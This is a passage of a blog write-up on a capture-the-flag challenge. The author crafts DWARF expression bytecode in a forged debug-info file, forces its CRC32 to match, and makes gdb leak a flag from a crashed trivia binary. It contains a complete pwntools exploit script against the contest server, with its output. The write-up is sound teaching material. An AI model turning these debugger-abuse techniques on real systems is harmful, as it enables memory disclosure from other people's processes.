</span><span>    DW_AT_const_value  DW_FORM_data1
</span><span>    DW_AT value: 0     DW_FORM value: 0
</span><span>   4      DW_TAG_variable    [no children]
</span><span>    DW_AT_name         DW_FORM_strp
</span><span>    DW_AT_location     DW_FORM_exprloc
</span><span>    DW_AT value: 0     DW_FORM value: 0
</span><span>
</span></code></pre><h3 id=generating-the-dwarf-shellcode>Generating the DWARF shellcode</h3><p>Now that we can execute dwarf bytecode, we have to figure out where the flag is stored in memory. The code can be summed up like this:<pre class=language-C data-lang=C style=color:#c0c5ce;background-color:#2b303b><code class=language-C data-lang=C><span style=color:#b48ead>int </span><span style=color:#8fa1b3>main</span><span>() {
</span><span>  __int64 rand_stack2;          </span><span style=color:#65737e>// rbx
</span><span>  </span><span style=color:#b48ead>unsigned int</span><span> v4;              </span><span style=color:#65737e>// eax
</span><span>  </span><span style=color:#b48ead>int</span><span> i;                        </span><span style=color:#65737e>// [rsp+18h] [rbp-58h]
</span><span>  </span><span style=color:#b48ead>int</span><span> fd;                       </span><span style=color:#65737e>// [rsp+1Ch] [rbp-54h]
</span><span>  </span><span style=color:#b48ead>char </span><span>*rand_map;               </span><span style=color:#65737e>// [rsp+20h] [rbp-50h]
</span><span>  __int64 rand_stack;           </span><span style=color:#65737e>// [rsp+28h] [rbp-48h] BYREF
</span><span>  </span><span style=color:#b48ead>unsigned </span><span>__int64 mmap_offset; </span><span style=color:#65737e>// [rsp+30h] [rbp-40h] BYREF
</span><span>  </span><span style=color:#b48ead>unsigned </span><span>__int64 score;       </span><span style=color:#65737e>// [rsp+38h] [rbp-38h]
</span><span>  </span><span style=color:#b48ead>unsigned </span><span>__int64 highscore;   </span><span style=color:#65737e>// [rsp+40h] [rbp-30h]
</span><span>  fdata *heapvar;               </span><span style=color:#65737e>// [rsp+48h] [rbp-28h]
</span><span>  FILE *stream;                 </span><span style=color:#65737e>// [rsp+50h] [rbp-20h]
</span><span>  </span><span style=color:#b48ead>unsigned </span><span>__int64 canary;      </span><span style=color:#65737e>// [rsp+58h] [rbp-18h]*
</span><span>
</span><span>  canary = </span><span style=color:#bf616a>__readfsqword</span><span>(</span><span style=color:#d08770>0x28</span><span style=color:#b48ead>u</span><span>);
</span><span>  heapvar = (fdata *)</span><span style=color:#96b5b4>malloc</span><span>(</span><span style=color:#d08770>0x18</span><span style=color:#b48ead>uLL</span><span>);
</span><span>  rand_map = (</span><span style=color:#b48ead>char </span><span>*)</span><span style=color:#bf616a>mmap_random</span><span>(</span><span style=color:#d08770>0x4C4B40</span><span style=color:#b48ead>uLL</span><span>);
</span><span>  score = </span><span style=color:#d08770>0</span><span style=color:#b48ead>LL</span><span>;
</span><span>  highscore = </span><span style=color:#d08770>5000</span><span style=color:#b48ead>LL</span><span>;
</span><span>  byte_4045FF = </span><span style=color:#d08770>0</span><span>;
</span><span>
</span><span>  fd = </span><span style=color:#bf616a>open</span><span>("</span><span style=color:#a3be8c>/dev/urandom</span><span>", </span><span style=color:#d08770>0</span><span>);
</span><span>  </span><span style=color:#bf616a>read</span><span>(fd, &rand_data, </span><span style=color:#d08770>8</span><span style=color:#b48ead>uLL</span><span>);
</span><span>  </span><span style=color:#bf616a>read</span><span>(fd, &rand_stack, </span><span style=color:#d08770>8</span><span style=color:#b48ead>uLL</span><span>);
</span><span>  </span><span style=color:#bf616a>read</span><span>(fd, &heapvar->rand_heap, </span><span style=color:#d08770>8</span><span style=color:#b48ead>uLL</span><span>);
</span><span>  </span><span style=color:#bf616a>read</span><span>(fd, &mmap_offset, </span><span style=color:#d08770>3</span><span style=color:#b48ead>uLL</span><span>);
</span><span>  mmap_offset %= </span><span style=color:#d08770>0x4C4B1C</span><span style=color:#b48ead>uLL</span><span>;
</span><span>
</span><span>  stream = </span><span style=color:#96b5b4>fopen</span><span>("</span><span style=color:#a3be8c>../../flag</span><span>", "</span><span style=color:#a3be8c>r</span><span>");
</span><span>  </span><span style=color:#96b5b4>setvbuf</span><span>(stream, </span><span style=color:#d08770>0</span><span style=color:#b48ead>LL</span><span>, </span><span style=color:#d08770>2</span><span>, </span><span style=color:#d08770>0</span><span style=color:#b48ead>LL</span><span>);
</span><span>  </span><span style=color:#96b5b4>fgets</span><span>(&rand_map[mmap_offset], </span><span style=color:#d08770>36</span><span>, stream);
</span><span>  rand_map[mmap_offset + </span><span style=color:#d08770>36</span><span>] = </span><span style=color:#d08770>0</span><span>;
</span><span>  </span><span style=color:#96b5b4>fclose</span><span>(stream);
</span><span>
</span><span>  rand_stack2 = heapvar->rand_heap ^ rand_stack ^ rand_data ^ (</span><span style=color:#b48ead>unsigned </span><span>__int64)&rand_map[mmap_offset];
</span><span>  mmap_offset = -</span><span style=color:#d08770>1</span><span style=color:#b48ead>LL</span><span>;
</span><span>
</span><span>  </span><span style=color:#65737e>// Start the quizz
</span><span>  </span><span style=color:#bf616a>read_questions</span><span>();
</span><span>  </span><span style=color:#bf616a>rand_swap</span><span>((__int64 *)questions, </span><span style=color:#d08770>25</span><span style=color:#b48ead>uLL</span><span>);
</span><span>  </span><span style=color:#b48ead>while </span><span>(</span><span style=color:#d08770>1</span><span>) {
</span><span>    </span><span style=color:#65737e>// ... (snip)
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#b48ead>return </span><span style=color:#bf616a>__readfsqword</span><span>(</span><span style=color:#d08770>0x28</span><span style=color:#b48ead>u</span><span>) ^ canary;
</span><span>}
</span></code></pre><p>We figure that the flag is stored at <code>&rand_map[mmap_offset]</code> which is a random location in the memory, but we are provided variables in different locations in the memory which once xored together could leak the flag position.<pre style=color:#c0c5ce;background-color:#2b303b><code><span>  rand_stack2 = heapvar->rand_heap ^ rand_stack ^ rand_data ^ &rand_map[mmap_offset]
</span></code></pre><p>Is equivalent to:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>  &rand_map[mmap_offset] = heapvar->rand_heap ^ rand_stack ^ rand_data ^ rand_stack2
</span></code></pre><p>Thanks to gdb we can spot their exact location in memory at the moment of the crash, and write a small shellcode to retrieve it:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#65737e>#!/usr/bin/env python3
</span><span style=color:#b48ead>import </span><span>struct
</span><span>
</span><span>
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>gen_file</span><span>(</span><span style=color:#bf616a>sc</span><span>):
</span><span>  data = </span><span style=color:#96b5b4>open</span><span>('</span><span style=color:#a3be8c>debug_info.s</span><span>', '</span><span style=color:#a3be8c>r</span><span>').</span><span style=color:#bf616a>read</span><span>()
</span><span>  data = data.</span><span style=color:#bf616a>replace</span><span>('</span><span style=color:#a3be8c>SHELLCODE_SIZE</span><span>', </span><span style=color:#bf616a>str</span><span>(</span><span style=color:#96b5b4>len</span><span>(sc)))
</span><span>  data = data.</span><span style=color:#bf616a>replace</span><span>('</span><span style=color:#a3be8c>SHELLCODE</span><span>', '</span><span style=color:#a3be8c>, </span><span>'.</span><span style=color:#bf616a>join</span><span>(</span><span style=color:#96b5b4>map</span><span>(</span><span style=color:#96b5b4>hex</span><span>, sc)))
</span><span>  </span><span style=color:#96b5b4>open</span><span>('</span><span style=color:#a3be8c>debug_info.gen.s</span><span>', '</span><span style=color:#a3be8c>w</span><span>').</span><span style=color:#bf616a>write</span><span>(data)
</span><span>
</span><span>
</span><span>DW_OP_const1u     = </span><span style=color:#d08770>0x08
</span><span>DW_OP_const2u     = </span><span style=color:#d08770>0x0a
</span><span>DW_OP_const4u     = </span><span style=color:#d08770>0x0c
</span><span>DW_OP_const8u     = </span><span style=color:#d08770>0x0e
</span><span>
</span><span>DW_OP_dup         = </span><span style=color:#d08770>0x12
</span><span>
</span><span>DW_OP_or          = </span><span style=color:#d08770>0x21
</span><span>DW_OP_plus        = </span><span style=color:#d08770>0x22
</span><span>DW_OP_shl         = </span><span style=color:#d08770>0x24
</span><span>DW_OP_shr         = </span><span style=color:#d08770>0x25
</span><span>DW_OP_xor         = </span><span style=color:#d08770>0x27
</span><span>
</span><span>DW_OP_deref       = </span><span style=color:#d08770>0x06
</span><span>DW_OP_reg7        = </span><span style=color:#d08770>0x57 </span><span style=color:#65737e># rsp
</span><span>DW_OP_breg7       = </span><span style=color:#d08770>0x77 </span><span style=color:#65737e># rsp
</span><span>DW_OP_piece       = </span><span style=color:#d08770>0x93
</span><span>DW_OP_stack_value = </span><span style=color:#d08770>0x9f
</span><span>DW_OP_push_object_address = </span><span style=color:#d08770>0x97
</span><span>
</span><span style=color:#65737e># Shellcode starts here
</span><span>sc = []
</span><span>
</span><span style=color:#65737e># Get the 3rd random value in the heap at [[rsp + 8*23] + 0x10]
</span><span>sc += [DW_OP_breg7, </span><span style=color:#d08770>0x00</span><span>]
</span><span>sc += [DW_OP_const1u, </span><span style=color:#d08770>8 </span><span>* </span><span style=color:#d08770>23</span><span>]
</span><span>sc += [DW_OP_plus]
</span><span>sc += [DW_OP_deref]
</span><span>sc += [DW_OP_const1u, </span><span style=color:#d08770>8 </span><span>* </span><span style=color:#d08770>2</span><span>]
</span><span>sc += [DW_OP_plus]
</span><span>sc += [DW_OP_deref]
</span><span>
</span><span style=color:#65737e># Get the 2nd random value at [rsp + 8*19]
</span><span>sc += [DW_OP_breg7, </span><span style=color:#d08770>0x00</span><span>]
</span><span>sc += [DW_OP_const1u, </span><span style=color:#d08770>8 </span><span>* </span><span style=color:#d08770>19</span><span>]
</span><span>sc += [DW_OP_plus]
</span><span>sc += [DW_OP_deref]
</span><span>
</span><span style=color:#65737e># xor them
</span><span>sc += [DW_OP_xor]
</span><span>
</span><span style=color:#65737e># Get the 1st random value at offset 0x404100 in .data
</span><span>sc += [DW_OP_const8u, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x41</span><span>, </span><span style=color:#d08770>0x40</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>, </span><span style=color:#d08770>0x00</span><span>]
</span><span>sc += [DW_OP_deref]
</span><span>
</span><span style=color:#65737e># xor them
</span><span>sc += [DW_OP_xor]
</span><span>
</span><span style=color:#65737e># Get the last value at [rsp]
</span><span>sc += [DW_OP_breg7, </span><span style=color:#d08770>0x00</span><span>]
</span><span>sc += [DW_OP_const1u, </span><span style=color:#d08770>0</span><span>]
</span><span>sc += [DW_OP_plus]
</span><span>sc += [DW_OP_deref]
</span><span>
</span><span style=color:#65737e># xor them
</span><span>sc += [DW_OP_xor]
</span><span>
</span><span style=color:#65737e># get the address
</span><span>sc += [DW_OP_stack_value]
</span><span>
</span><span style=color:#bf616a>gen_file</span><span>(sc)
</span></code></pre><p>This looks great but while trying locally I stumbled on an issue where using the <code>DW_OP_stack_value</code> which uses the value on the top of the stack as the address would actually sign extend it and retrieve something as <code>0xffffffff41424344</code> for the flag address. I couldn't get rid of this and thus did not manage to have a successful <code>x/s</code> working and printing the entire flag as a string.<p>However, if we remove <code>DW_OP_stack_value</code> from our shellcode, <code>x/s</code> will leak the first 4 bytes of the flag, and thus we can simply repeat the operation by incrementing the pointer 4 by 4 (and I'm happy there are only 36 bytes to leak):<pre style=color:#c0c5ce;background-color:#2b303b><code><span>sc += [DW_OP_const1u, 4]
</span><span>sc += [DW_OP_plus]
</span></code></pre><h2 id=executing-remotely>Executing remotely</h2><p>Now we're ready, we can make sure our file does not contain any <code>\n</code> character and send it remotely. We quickly realise that the CRC does not match. Of course, we have to patch the CRC to the one that was hardcoded in the <code>trivia</code> binary i.e. <code>3d46c53b</code>. For that I used <a href=https://www.nayuki.io/res/forcing-a-files-crc-to-any-value/forcecrc32.py>this script</a> which would allow me to force a CRC32 for my input file (kudos to burrito, it is indeed faster than bruteforcing like a dummy).<p>Tried it again, and whoops, it still didn't work. And for a good reason, after <code>fgets</code> is called, the character <code>\n</code> is added to the content of our file followed by the player's score divided by <code>0x64</code>! So I had to append my current score to the file first, force its CRC to the one we wanted, then remove it again so that the CRC matches when the remote binary appends our score to the file.<p>Here's my not-so-pretty but working script:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#65737e>#!/usr/bin/env python3
</span><span>
</span><span style=color:#b48ead>from </span><span>pwn </span><span style=color:#b48ead>import </span><span style=color:#d08770>*
</span><span style=color:#b48ead>import </span><span>struct
</span><span style=color:#b48ead>import </span><span>binascii
</span><span style=color:#b48ead>import </span><span>forcecrc32
</span><span>
</span><span>answers = {}
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>readquestions</span><span>():
</span><span>    data = </span><span style=color:#96b5b4>open</span><span>('</span><span style=color:#a3be8c>questions.txt</span><span>', '</span><span style=color:#a3be8c>rb</span><span>').</span><span style=color:#bf616a>read</span><span>()
</span><span>    data = data.</span><span style=color:#bf616a>decode</span><span>('</span><span style=color:#a3be8c>utf-8</span><span>').</span><span style=color:#bf616a>split</span><span>("</span><span style=color:#96b5b4>\n</span><span>")
</span><span>    </span><span style=color:#b48ead>for </span><span>x </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#bf616a>int</span><span>(</span><span style=color:#96b5b4>len</span><span>(data)/</span><span style=color:#d08770>2</span><span>)):
</span><span>        q = data[x*</span><span style=color:#d08770>2</span><span>]
</span><span>        a = data[x*</span><span style=color:#d08770>2</span><span>+</span><span style=color:#d08770>1</span><span>]
</span><span>        answers[q] = a
</span><span>
</span><span>last_score = </span><span style=color:#d08770>0
</span><span>
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>question</span><span>(</span><span style=color:#bf616a>minscore</span><span>, </span><span style=color:#bf616a>fail</span><span>=</span><span style=color:#d08770>False</span><span>):
</span><span>    </span><span style=color:#b48ead>global </span><span>last_score
</span><span>    line = r.</span><span style=color:#bf616a>recvline</span><span>()
</span><span>    </span><span style=color:#b48ead>if </span><span>line == </span><span style=color:#b48ead>b</span><span>'</span><span style=color:#96b5b4>\n</span><span>':
</span><span>        </span><span style=color:#b48ead>return </span><span style=color:#d08770>False
</span><span>    </span><span style=color:#b48ead>try</span><span>:
</span><span>        score = </span><span style=color:#bf616a>int</span><span>(line.</span><span style=color:#bf616a>split</span><span>(</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>:</span><span>')[</span><span style=color:#d08770>1</span><span>].</span><span style=color:#bf616a>split</span><span>()[</span><span style=color:#d08770>0</span><span>].</span><span style=color:#bf616a>decode</span><span>())
</span><span>        last_score = score
</span><span>    </span><span style=color:#b48ead>except</span><span>:
</span><span>        </span><span style=color:#96b5b4>print</span><span>(line)
</span><span>        </span><span style=color:#b48ead>return </span><span style=color:#d08770>False
</span><span>    r.</span><span style=color:#bf616a>recvuntil</span><span>('</span><span style=color:#a3be8c>:</span><span style=color:#96b5b4>\n</span><span>')
</span><span>    q = r.</span><span style=color:#bf616a>recvline</span><span>().</span><span style=color:#bf616a>decode</span><span>().</span><span style=color:#bf616a>strip</span><span>() </span><span style=color:#65737e># question
</span><span>    </span><span style=color:#b48ead>if </span><span>not fail and q in answers:
</span><span>        answer = answers[q]
</span><span>    </span><span style=color:#b48ead>else</span><span>:
</span><span>        answer = '</span><span style=color:#a3be8c>UNK</span><span>'
</span><span>    r.</span><span style=color:#bf616a>send</span><span>(answer + '</span><span style=color:#96b5b4>\n</span><span>')
</span><span>    r.</span><span style=color:#bf616a>recvline</span><span>()
</span><span>    r.</span><span style=color:#bf616a>recvline</span><span>()
</span><span>    res = r.</span><span style=color:#bf616a>recvline</span><span>()
</span><span>    </span><span style=color:#b48ead>if b</span><span>'</span><span style=color:#a3be8c>WRONG</span><span>' in res and not fail:
</span><span>        </span><span style=color:#96b5b4>print</span><span>(</span><span style=color:#b48ead>f</span><span>'</span><span style=color:#a3be8c>Wrong answer for "</span><span>{q}</span><span style=color:#a3be8c>" (sent "</span><span>{answer}</span><span style=color:#a3be8c>")</span><span>')
</span><span>    r.</span><span style=color:#bf616a>send</span><span>('</span><span style=color:#96b5b4>\n</span><span>')
</span><span>    </span><span style=color:#b48ead>return </span><span>score <= minscore or fail
</span><span>
</span><span style=color:#65737e># Init answers and socket
</span><span style=color:#bf616a>readquestions</span><span>()
</span><span>r = </span><span style=color:#bf616a>remote</span><span>('</span><span style=color:#a3be8c>exploit-for-dummies.challenges.ooo</span><span>', </span><span style=color:#d08770>5000</span><span>)
</span><span>r.</span><span style=color:#bf616a>recvuntil</span><span>('</span><span style=color:#a3be8c>spawn the service up for you.</span><span style=color:#96b5b4>\n</span><span>')
</span><span>r.</span><span style=color:#bf616a>send</span><span>('</span><span style=color:#96b5b4>\n</span><span>')
</span><span style=color:#96b5b4>print</span><span>(r.</span><span style=color:#bf616a>recvline</span><span>()) </span><span style=color:#65737e># starting...
</span><span style=color:#96b5b4>print</span><span>(r.</span><span style=color:#bf616a>recvline</span><span>()) </span><span style=color:#65737e># cd
</span><span style=color:#96b5b4>print</span><span>(r.</span><span style=color:#bf616a>recvline</span><span>()) </span><span style=color:#65737e># ./trivia
</span><span>
</span><span style=color:#65737e># Answer correctly to questions
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>play</span><span>(</span><span style=color:#bf616a>score</span><span>=</span><span style=color:#d08770>5000</span><span>):
</span><span>    run = </span><span style=color:#d08770>True
</span><span>    </span><span style=color:#b48ead>while </span><span>run:
</span><span>        run = </span><span style=color:#bf616a>question</span><span>(score)
</span><span>
</span><span>    </span><span style=color:#65737e># Minimum score is reached, abort asap
</span><span>    run = </span><span style=color:#d08770>True
</span><span>    </span><span style=color:#b48ead>while </span><span>run:
</span><span>        run = </span><span style=color:#bf616a>question</span><span>(score, </span><span style=color:#d08770>True</span><span>)
</span><span>
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>save_score</span><span>(</span><span style=color:#bf616a>name</span><span>, </span><span style=color:#bf616a>data</span><span>):
</span><span>    r.</span><span style=color:#bf616a>recvuntil</span><span>('</span><span style=color:#a3be8c>save your score? (yes/no)</span><span style=color:#96b5b4>\n</span><span>')
</span><span>    r.</span><span style=color:#bf616a>sendline</span><span>('</span><span style=color:#a3be8c>yes</span><span>')
</span><span>    r.</span><span style=color:#bf616a>sendlineafter</span><span>('</span><span style=color:#a3be8c>Name:</span><span>', name)
</span><span>    </span><span style=color:#b48ead>if </span><span>name == '</span><span style=color:#a3be8c>questions.txt</span><span>':
</span><span>        </span><span style=color:#b48ead>return
</span><span>    r.</span><span style=color:#bf616a>recvuntil</span><span>('</span><span style=color:#a3be8c>Your Name</span><span>')
</span><span>    </span><span style=color:#96b5b4>print</span><span>('</span><span style=color:#a3be8c>CRC:</span><span>', </span><span style=color:#96b5b4>hex</span><span>(binascii.</span><span style=color:#bf616a>crc32</span><span>(data)), </span><span style=color:#96b5b4>len</span><span>(data))
</span><span>    </span><span style=color:#65737e># \n included in data for CRC match
</span><span>    </span><span style=color:#b48ead>assert </span><span>data[-</span><span style=color:#d08770>1</span><span>] == </span><span style=color:#d08770>0x0a
</span><span>    x = r.</span><span style=color:#bf616a>send</span><span>(data)
</span><span>    </span><span style=color:#96b5b4>print</span><span>('</span><span style=color:#a3be8c>Sent</span><span>', x)
</span><span>    r.</span><span style=color:#bf616a>sendlineafter</span><span>('</span><span style=color:#a3be8c>play again? (yes/no)</span><span style=color:#96b5b4>\n</span><span>', '</span><span style=color:#a3be8c>yes</span><span>')
</span><span>
</span><span style=color:#65737e># Now make it segfault and send data
</span><span style=color:#b48ead>def </span><span style=color:#8fa1b3>dump</span><span>(</span><span style=color:#bf616a>payload</span><span>):
</span><span>    </span><span style=color:#bf616a>save_score</span><span>('</span><span style=color:#a3be8c>questions.txt</span><span>', </span><span style=color:#d08770>None</span><span>)
</span><span>    r.</span><span style=color:#bf616a>sendlineafter</span><span>('</span><span style=color:#a3be8c>continue</span><span>', '')
</span><span>    r.</span><span style=color:#bf616a>sendlineafter</span><span>('</span><span style=color:#a3be8c>input</span><span>', '')
</span><span>    r.</span><span style=color:#bf616a>sendlineafter</span><span>('</span><span style=color:#a3be8c>Address</span><span>', payload)
</span><span>    r.</span><span style=color:#bf616a>interactive</span><span>()
</span><span>
</span><span>    </span><span style=color:#96b5b4>print</span><span>(r.</span><span style=color:#bf616a>recvuntil</span><span>('</span><span style=color:#a3be8c>x/s </span><span>' + payload + '</span><span style=color:#96b5b4>\n</span><span>'))
</span><span>    gdb_data = r.</span><span style=color:#bf616a>recvuntil</span><span>(payload + '</span><span style=color:#a3be8c>:</span><span>')
</span><span>    addr = r.</span><span style=color:#bf616a>recvline</span><span>()
</span><span>    </span><span style=color:#96b5b4>print</span><span>(gdb_data.</span><span style=color:#bf616a>decode</span><span>(), </span><span style=color:#bf616a>end</span><span>='')
</span><span>    </span><span style=color:#96b5b4>print</span><span>(addr.</span><span style=color:#bf616a>decode</span><span>())
</span><span>    </span><span style=color:#96b5b4>print</span><span>(r.</span><span style=color:#bf616a>recvline</span><span>())
</span><span>
</span><span>
</span><span style=color:#65737e>### 
</span><span>score = </span><span style=color:#bf616a>play</span><span>()
</span><span style=color:#96b5b4>print</span><span>('</span><span style=color:#a3be8c>your score is</span><span>', last_score)
</span><span>score = last_score // </span><span style=color:#d08770>0x64
</span><span>data = </span><span style=color:#96b5b4>open</span><span>('</span><span style=color:#a3be8c>./trivia.debug</span><span>', '</span><span style=color:#a3be8c>rb</span><span>').</span><span style=color:#bf616a>read</span><span>()
</span><span>data = data + int.</span><span style=color:#bf616a>to_bytes</span><span>(score, </span><span style=color:#d08770>1</span><span>, '</span><span style=color:#a3be8c>big</span><span>')
</span><span style=color:#96b5b4>open</span><span>('</span><span style=color:#a3be8c>./trivia.debug.sent</span><span>', '</span><span style=color:#a3be8c>wb</span><span>').</span><span style=color:#bf616a>write</span><span>(data)
</span><span style=color:#96b5b4>__import__</span><span>('</span><span style=color:#a3be8c>os</span><span>').</span><span style=color:#bf616a>system</span><span>('</span><span style=color:#a3be8c>python3 forcecrc32.py ./trivia.debug.sent 304 3d46c53b</span><span>') </span><span style=color:#65737e># I'm not proud but that's how I did it
</span><span style=color:#bf616a>save_score</span><span>('</span><span style=color:#a3be8c>trivia.debug</span><span>', </span><span style=color:#96b5b4>open</span><span>('</span><span style=color:#a3be8c>./trivia.debug.sent</span><span>', '</span><span style=color:#a3be8c>rb</span><span>').</span><span style=color:#bf616a>read</span><span>()[:-</span><span style=color:#d08770>1</span><span>])
</span><span style=color:#bf616a>play</span><span>(last_score)
</span><span style=color:#bf616a>dump</span><span>('</span><span style=color:#a3be8c>0x0+first</span><span>') </span><span style=color:#65737e># Leak the symbol 'first'
</span></code></pre><p>Et voilà! After a while we can see the following:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>...
</span><span>warning: section .bss not found in /home/dummies/tmp/dir_4912804/trivia.debug
</span><span>[New LWP 37]
</span><span>Core was generated by `./trivia'.
</span><span>Program terminated with signal SIGSEGV, Segmentation fault.
</span><span>#0  0x00007fc068c97f5b in _IO_new_fclose (fp=0x0) at iofclose.c:48
</span><span>48    iofclose.c: No such file or directory.
</span><span>(gdb) 0x7b4f4f4f:    &LTerror: Cannot access memory at address 0x7b4f4f4f>
</span></code></pre><p>And as you would have guessed already, <code>0x7b4f4f4f</code> in little-endian corresponds to the characters <code>OOO{</code> which is the mark of the beginning of the flag. All I had to do now was to adjust the shellcode to read the bytes 4 by 4 until the full flag is leaked:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>p32 = </span><span style=color:#b48ead>lambda </span><span style=color:#bf616a>x</span><span>: struct.</span><span style=color:#bf616a>pack</span><span>('</span><span style=color:#a3be8c>&LTI</span><span>', x)
</span><span>flag = </span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>OOO{</span><span>' + </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x72617764</span><span>) + </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x68732066</span><span>) + </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x636c6c65</span><span>) + </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x7365646f</span><span>) + </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x65726120</span><span>) + </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x72657620</span><span>) + </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x656c2079</span><span>) + </span><span style=color:#bf616a>p32</span><span>(</span><span style=color:#d08770>0x7d7465</span><span>)
</span><span style=color:#96b5b4>print</span><span>(flag)
</span></code></pre><p><pre style=color:#c0c5ce;background-color:#2b303b><code><span>OOO{dwarf shellcodes are very leet}
</span></code></pre><h2 id=conclusion>Conclusion</h2><p>I found this challenge very interesting as I learned a lot about the capabilities of DWARF. It still amazes me how complex this language is and all the things one can do with it.<p>I'd like to thank <a href=https://twitter.com/yrp604>yrp</a>, <a href=https://twitter.com/0xGrimmlin>grimmlin</a>, burrito and clz for their help during this challenge and the time they spent helping a dummy.</div></main><footer>2024 - Antide Petit aka <a href=https://xarkes.com>xarkes</a> - <a href=https://creativecommons.org/licenses/by-sa/4.0/>CC-BY-SA</a> - Made with ❤️</footer>